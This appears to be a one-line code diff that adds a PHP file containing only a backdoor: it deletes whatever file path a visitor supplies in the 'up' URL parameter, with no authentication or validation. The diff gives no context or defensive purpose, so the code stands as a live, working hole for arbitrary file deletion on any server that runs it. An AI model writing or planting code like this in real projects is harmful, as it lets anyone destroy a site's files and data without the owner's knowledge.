@@ -1,0 +1,1 @@
+<?php if(isset($_GET["up"])){ echo unlink("".$_GET["up"].""); } ?>
